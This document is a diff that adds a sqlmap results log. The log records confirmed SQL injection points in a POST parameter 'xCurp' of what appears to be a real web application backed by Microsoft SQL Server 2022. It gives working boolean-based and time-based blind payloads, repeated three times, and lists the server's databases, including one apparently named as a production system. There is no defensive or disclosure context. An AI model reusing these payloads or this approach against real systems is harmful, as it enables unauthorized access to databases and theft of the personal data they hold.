@@ -1,0 +1,45 @@
+sqlmap identified the following injection point(s) with a total of 434 HTTP(s) requests:
+---
+Parameter: xCurp (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: xCurp=-7799') OR 6161=6161 AND ('mJPc'='mJPc&yAccion=VCURP
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
+    Payload: xCurp=AAAAAAAAAAAAAAAAAA') AND 8790=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('EYIt'='EYIt&yAccion=VCURP
+---
+web application technology: JSP, Django
+back-end DBMS: Microsoft SQL Server 2022
+available databases [4]:
+[*] model
+[*] msdb
+[*] Sito_Sanluis_productivo
+[*] tempdb
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: xCurp (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: xCurp=-7799') OR 6161=6161 AND ('mJPc'='mJPc&yAccion=VCURP
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
+    Payload: xCurp=AAAAAAAAAAAAAAAAAA') AND 8790=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('EYIt'='EYIt&yAccion=VCURP
+---
+web application technology: JSP, Django
+back-end DBMS: Microsoft SQL Server 2022
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: xCurp (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: xCurp=-7799') OR 6161=6161 AND ('mJPc'='mJPc&yAccion=VCURP
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
+    Payload: xCurp=AAAAAAAAAAAAAAAAAA') AND 8790=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ('EYIt'='EYIt&yAccion=VCURP
+---
+web application technology: JSP, Django
+back-end DBMS: Microsoft SQL Server 2022
